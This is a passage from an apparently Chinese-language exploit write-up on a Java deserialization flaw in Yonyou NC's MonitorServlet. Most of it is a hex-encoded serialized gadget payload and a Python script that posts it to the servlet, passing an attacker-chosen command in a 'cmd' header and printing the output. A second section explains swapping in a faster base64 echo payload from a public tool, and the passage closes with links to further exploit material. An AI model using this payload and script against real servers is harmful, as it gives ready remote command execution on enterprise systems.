x0c\x75\x73\x65\x44\x65\x6c\x69\x6d\x69\x74\x65\x72\x01\x00\x27\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x53\x63\x61\x6e\x6e\x65\x72\x3b\x01\x00\x04\x6e\x65\x78\x74\x01\x00\x14\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x01\x00\x13\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x50\x72\x69\x6e\x74\x57\x72\x69\x74\x65\x72\x01\x00\x05\x66\x6c\x75\x73\x68\x01\x00\x05\x63\x6c\x6f\x73\x65\x01\x00\x11\x67\x65\x74\x44\x65\x63\x6c\x61\x72\x65\x64\x46\x69\x65\x6c\x64\x73\x01\x00\x1c\x28\x29\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x46\x69\x65\x6c\x64\x3b\x01\x00\x0d\x73\x65\x74\x41\x63\x63\x65\x73\x73\x69\x62\x6c\x65\x01\x00\x04\x28\x5a\x29\x56\x01\x00\x03\x67\x65\x74\x01\x00\x26\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x01\x00\x07\x69\x73\x41\x72\x72\x61\x79\x01\x00\x03\x28\x29\x5a\x01\x00\x0d\x67\x65\x74\x53\x75\x70\x65\x72\x63\x6c\x61\x73\x73\x00\x21\x00\x2e\x00\x17\x00\x00\x00\x03\x00\x08\x00\x2f\x00\x30\x00\x01\x00\x31\x00\x00\x00\x02\x00\x32\x00\x08\x00\x33\x00\x34\x00\x00\x00\x08\x00\x35\x00\x36\x00\x00\x00\x05\x00\x01\x00\x37\x00\x38\x00\x01\x00\x39\x00\x00\x00\x1d\x00\x01\x00\x01\x00\x00\x00\x05\x2a\xb7\x00\x01\xb1\x00\x00\x00\x01\x00\x3a\x00\x00\x00\x06\x00\x01\x00\x00\x00\x0a\x00\x09\x00\x3b\x00\x3c\x00\x01\x00\x39\x00\x00\x00\x4e\x00\x02\x00\x01\x00\x00\x00\x22\xb2\x00\x02\x12\x03\xb6\x00\x04\x01\xb3\x00\x05\x01\xb3\x00\x06\xbb\x00\x07\x59\xb7\x00\x08\xb3\x00\x09\xb8\x00\x0a\x03\xb8\x00\x0b\xb1\x00\x00\x00\x01\x00\x3a\x00\x00\x00\x1a\x00\x06\x00\x00\x00\x11\x00\x08\x00\x12\x00\x0c\x00\x13\x00\x10\x00\x14\x00\x1a\x00\x15\x00\x21\x00\x16\x00\x0a\x00\x3d\x00\x3e\x00\x01\x00\x39\x00\x00\x00\x48\x00\x02\x00\x01\x00\x00\x00\x1a\x2a\xc6\x00\x0d\xb2\x00\x09\x2a\xb6\x00\x0c\x99\x00\x05\x04\xac\xb2\x00\x09\x2a\xb6\x00\x0d\x57\x03\xac\x00\x00\x00\x02\x00\x3a\x00\x00\x00\x12\x00\x04\x00\x00\x00\x21\x00\x0e\x00\x22\x00\x10\x00\x25\x00\x18\x00\x26\x00\x3f\x00\x00\x00\x04\x00\x02\x0e\x01\x00\x0a\x00\x35\x00\x40\x00\x01\x00\x39\x00\x00\x01\x58\x00\x06\x00\x03\x00\x00\x00\xcb\x1b\x10\x34\xa3\x00\x0f\xb2\x00\x05\xc6\x00\x0a\xb2\x00\x06\xc6\x00\x04\xb1\x2a\xb8\x00\x0e\x9a\x00\xb3\xb2\x00\x05\xc7\x00\x52\x13\x00\x0f\x2a\xb6\x00\x10\xb6\x00\x11\x99\x00\x45\x2a\xc0\x00\x0f\xb3\x00\x05\xb2\x00\x05\x12\x12\xb9\x00\x13\x02\x00\xc7\x00\x0a\x01\xb3\x00\x05\xa7\x00\x2a\xb2\x00\x05\xb6\x00\x10\x12\x14\x03\xbd\x00\x15\xb6\x00\x16\xb2\x00\x05\x03\xbd\x00\x17\xb6\x00\x18\xc0\x00\x19\xb3\x00\x06\xa7\x00\x08\x4d\x01\xb3\x00\x05\xb2\x00\x05\xc6\x00\x51\xb2\x00\x06\xc6\x00\x4b\xb2\x00\x06\xb9\x00\x1b\x01\x00\xbb\x00\x1c\x59\xb8\x00\x1d\xb2\x00\x05\x12\x12\xb9\x00\x13\x02\x00\xb6\x00\x1e\xb6\x00\x1f\xb7\x00\x20\x12\x21\xb6\x00\x22\xb6\x00\x23\xb6\x00\x24\xb2\x00\x06\xb9\x00\x1b\x01\x00\xb6\x00\x25\xb2\x00\x06\xb9\x00\x1b\x01\x00\xb6\x00\x26\xa7\x00\x04\x4d\xb1\x2a\x1b\x04\x60\xb8\x00\x0b\xb1\x00\x02\x00\x48\x00\x67\x00\x6a\x00\x1a\x00\x7b\x00\xbe\x00\xc1\x00\x1a\x00\x02\x00\x3a\x00\x00\x00\x52\x00\x14\x00\x00\x00\x29\x00\x12\x00\x2a\x00\x13\x00\x2c\x00\x1a\x00\x2d\x00\x2d\x00\x2e\x00\x34\x00\x2f\x00\x41\x00\x30\x00\x48\x00\x33\x00\x67\x00\x38\x00\x6a\x00\x36\x00\x6b\x00\x37\x00\x6f\x00\x3c\x00\x7b\x00\x3f\x00\xa8\x00\x40\x00\xb3\x00\x41\x00\xbe\x00\x43\x00\xc1\x00\x42\x00\xc2\x00\x44\x00\xc3\x00\x47\x00\xca\x00\x49\x00\x3f\x00\x00\x00\x13\x00\x09\x12\x00\x34\x61\x07\x00\x41\x04\xf7\x00\x51\x07\x00\x41\x00\x00\x06\x00\x0a\x00\x42\x00\x40\x00\x01\x00\x39\x00\x00\x01\x10\x00\x02\x00\x0c\x00\x00\x00\x84\x2a\xb6\x00\x10\x4d\x2c\xb6\x00\x27\x4e\x2d\xbe\x36\x04\x03\x36\x05\x15\x05\x15\x04\xa2\x00\x65\x2d\x15\x05\x32\x3a\x06\x19\x06\x04\xb6\x00\x28\x01\x3a\x07\x19\x06\x2a\xb6\x00\x29\x3a\x07\x19\x07\xb6\x00\x10\xb6\x00\x2a\x9a\x00\x0c\x19\x07\x1b\xb8\x00\x2b\xa7\x00\x2f\x19\x07\xc0\x00\x2c\xc0\x00\x2c\x3a\x08\x19\x08\xbe\x36\x09\x03\x36\x0a\x15\x0a\x15\x09\xa2\x00\x16\x19\x08\x15\x0a\x32\x3a\x0b\x19\x0b\x1b\xb8\x00\x2b\x84\x0a\x01\xa7\xff\xe9\xa7\x00\x05\x3a\x08\x84\x05\x01\xa7\xff\x9a\x2c\xb6\x00\x2d\x59\x4d\xc7\xff\x85\xb1\x00\x01\x00\x27\x00\x6f\x00\x72\x00\x1a\x00\x02\x00\x3a\x00\x00\x00\x3e\x00\x0f\x00\x00\x00\x4c\x00\x05\x00\x4e\x00\x1e\x00\x4f\x00\x24\x00\x50\x00\x27\x00\x52\x00\x2f\x00\x54\x00\x3a\x00\x55\x00\x43\x00\x57\x00\x63\x00\x58\x00\x69\x00\x57\x00\x6f\x00\x5e\x00\x72\x00\x5d\x00\x74\x00\x4e\x00\x7a\x00\x62\x00\x83\x00\x64\x00\x3f\x00\x00\x00\x2e\x00\x08\xfc\x00\x05\x07\x00\x43\xfe\x00\x0b\x07\x00\x44\x01\x01\xfd\x00\x31\x07\x00\x45\x07\x00\x46\xfe\x00\x11\x07\x00\x2c\x01\x01\xf8\x00\x19\x42\x07\x00\x41\xf9\x00\x01\xf8\x00\x05\x00\x01\x00\x47\x00\x00\x00\x02\x00\x48\x74\x00\x0b\x64\x65\x66\x69\x6e\x65\x43\x6c\x61\x73\x73\x75\x71\x00\x7e\x00\x1a\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\xa0\xf0\xa4\x38\x7a\x3b\xb3\x42\x02\x00\x00\x78\x70\x76\x71\x00\x7e\x00\x28\x73\x71\x00\x7e\x00\x13\x75\x71\x00\x7e\x00\x18\x00\x00\x00\x02\x74\x00\x04\x6d\x61\x69\x6e\x75\x71\x00\x7e\x00\x1a\x00\x00\x00\x01\x76\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x78\x70\x74\x00\x09\x67\x65\x74\x4d\x65\x74\x68\x6f\x64\x75\x71\x00\x7e\x00\x1a\x00\x00\x00\x02\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x1e\x73\x71\x00\x7e\x00\x13\x75\x71\x00\x7e\x00\x18\x00\x00\x00\x02\x70\x75\x71\x00\x7e\x00\x18\x00\x00\x00\x01\x70\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x75\x71\x00\x7e\x00\x1a\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70\x71\x00\x7e\x00\x24\x73\x71\x00\x7e\x00\x0f\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75\x65\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e\x75\x6d\x62\x65\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00\x78\x70\x00\x00\x00\x01\x73\x71\x00\x7e\x00\x00\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x00\x78\x78\x74\x00\x0a\x76\x61\x6c\x75\x65\x76\x61\x6c\x75\x65\x78"

    uploadHeader={
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "cmd": cmd
        }
        
    # req = requests.post(url + "/servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet", headers=uploadHeader, verify=False, data=data, timeout=60)
    # req = requests.post(url + "/servlet/monitorservlet", headers=uploadHeader, verify=False, data=data)
    req = requests.post(url + "/servlet/monitorservlet", headers=uploadHeader, verify=False, data=data, proxies=proxies)

    print ("\n\033[1;37;43mreq.headers:\033[0m")
    print (req.headers)

    print ("\n\033[1;37;43mreq.text:\033[0m")
    print (req.text)

    print ("\n\033[1;37;43mreq.status_code:\033[0m")
    print (req.status_code)


if __name__ == '__main__':
    exp(url=sys.argv[1], cmd=sys.argv[2])

```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/205454502-43a2ab2c-08bf-451d-811b-c3426ec3b11c.png" /></div>

### 3.5.2 exp-v2
不过经过测试，发现上面的exp响应比较慢，而 [Ghost2097221/YongyouNC-Unserialize-Tools](https://github.com/Ghost2097221/YongyouNC-Unserialize-Tools) 的回显 `payload` 效率更高！

<div align=center><img src="https://user-images.githubusercontent.com/84888757/205454581-b5d65106-e5a8-4e48-ba91-3c0bd42eca82.png" /></div>

然后用 `Sublime` 去除掉换行符，`command+shift+F` 打开全局搜索替换框；

在 `Find` 中，`control+shift+enter`；

其他什么也不填，点击 `Replace` ：

<div align=center><img src="https://user-images.githubusercontent.com/84888757/205454643-a6dd0a54-0d85-4380-9e53-92f0204542ee.png" /></div>

base64解码，将序列化数据放进文件中：
```
cat base64payload.txt | base64 -d > ser2.bin
```

然后用 📒 `bin2hex_v2.py` 把序列化数据转化成`hex`形式，替换 📒 `monitor_poc.py` 里的 `data` 部分就可以用了。



# 0x04 参考链接
- [用友NC 反序列化回显构造 _payload食用 @zhzhdoai](https://zhzhdoai.github.io/2020/09/17/%E6%9F%90NC-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/)
- [用友NC历史漏洞(含POC) @珂字辈](https://mp.weixin.qq.com/s/xVKuJb3DbKH0em0HoMZ4ZQ)
- [Java中间件通用回显方法的问题及处理(7.7更新) @fnmsd](https://blog.csdn.net/fnmsd/article/details/106890242)
- [Tomcat回显类 @fnmsd](https://gist.github.com/fnmsd/4d9ed529ceb6c2a464f75c379dadd3a8)
- [Ghost2097221/YongyouNC-Unserialize-Tools](https://github.com/Ghost2097221/YongyouNC-Unserialize-Tools/releases/download/YongyouNC-Unserialize-Tools/yonyouNCTools.jar)
- [CommonsCollections6简化版 @phith0n](https://github.com/phith0n/JavaThings/blob/master/general/src/main/java/com/govuln/deserialization/CommonsCollections6.java)
